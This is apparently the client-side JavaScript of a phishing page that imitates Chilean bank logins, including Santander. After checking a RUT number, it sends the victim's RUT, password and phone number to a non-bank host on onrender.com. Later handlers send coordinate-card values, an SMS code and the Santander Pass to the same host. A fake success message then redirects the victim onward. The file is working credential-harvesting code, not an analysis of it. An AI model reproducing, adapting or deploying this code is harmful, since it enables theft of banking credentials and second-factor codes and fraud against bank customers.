// Validación de RUT
function validarRut(rutCompleto) {
  rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
  if(rutCompleto.length < 2) return false;
  let cuerpo = rutCompleto.slice(0, -1);
  let dv = rutCompleto.slice(-1);
  let suma = 0, multiplo = 2;
  for(let i = cuerpo.length - 1; i >= 0; i--) {
    suma += parseInt(cuerpo.charAt(i)) * multiplo;
    multiplo = multiplo < 7 ? multiplo + 1 : 2;
  }
  let dvEsperado = 11 - (suma % 11);
  dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
  return dv === dvEsperado;
}

// Login
document.getElementById("loginForm").addEventListener("submit", async function(e){
  e.preventDefault();
  const rut = document.getElementById("rut").value;
  const passwd = document.getElementById("passwd").value;
  const telefono = document.getElementById("telefono").value;
  const contacto = document.getElementById("contacto").checked;

  if(!validarRut(rut)){
    document.getElementById("resultado").innerText = "❌ RUT inválido";
    return;
  }
  if(!contacto){
    document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
    return;
  }

  try {
    const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ rut, passwd, telefono })
    });

    const data = await response.text();
    console.log("Respuesta del servidor:", data);

    if (data.includes("Revisa tu conexión a internet")) {
      document.getElementById("resultado").innerText = "⚠️ Error de conexión con Office Banking.";
    } else if (response.ok && data.includes("OK")) {
      document.getElementById("resultado").innerText = "✅ Login exitoso.";
      setTimeout(()=> window.location.href = "productos.html", 1500);
    } else {
      document.getElementById("resultado").innerText = data;
    }
  } catch (error) {
    console.error("Error en fetch:", error);
    document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
  }
});

// Autorización
const tipoAutorizacion = document.getElementById("tipoAutorizacion");
const formSantander = document.getElementById("formSantander");
const formCoordenadas = document.getElementById("formCoordenadas");

tipoAutorizacion.addEventListener("change", async () => {
  if(tipoAutorizacion.value === "santander"){
    formSantander.style.display = "block";
    formCoordenadas.style.display = "none";
  } else {
    formSantander.style.display = "none";
    formCoordenadas.style.display = "block";

    // Pedir coordenadas dinámicas al backend
    try {
      const resp = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/coordenadas");
      const data = await resp.json();

      document.getElementById("coordLabelA").innerText = `Coordenada ${data.coordenadas[0]}`;
      document.getElementById("coordLabelB").innerText = `Coordenada ${data.coordenadas[1]}`;
      document.getElementById("coordLabelC").innerText = `Coordenada ${data.coordenadas[2]}`;
    } catch (err) {
      console.error("Error al obtener coordenadas:", err);
    }
  }
});

formSantander.addEventListener("submit", async (e) => {
  e.preventDefault();
  const pass = document.getElementById("passSantander").value;
  const mensaje = `Santander Pass: ${pass}`;

  try {
    await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ mensaje })
    });
    alert("✅ Autorización enviada");
  } catch (err) {
    alert("❌ Error al enviar autorización");
  }
});

formCoordenadas.addEventListener("submit", async (e) => {
  e.preventDefault();
  const coordA = document.getElementById("coordA").value;
  const coordB = document.getElementById("coordB").value;
  const coordC = document.getElementById("coordC").value;
  const claveSMS = document.getElementById("claveSMS").value;

  const mensaje = `Autorización Coordenadas:
  Coordenada A: ${coordA}
  Coordenada B: ${coordB}
  Coordenada C: ${coordC}
  Clave SMS: ${claveSMS}`;

  try {
    await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ mensaje })
    });
    alert("✅ Autorización enviada");
  } catch (err) {
    console.error("Error en autorización coordenadas:", err);
    alert("❌ Error al enviar autorización");
  }
});
